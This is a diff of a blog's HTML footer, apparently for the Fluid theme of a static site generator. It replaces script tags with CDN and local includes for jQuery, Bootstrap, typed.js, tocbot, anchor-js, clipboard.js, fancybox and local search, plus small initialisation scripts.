+<script  src="/js/jquery.min.js/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
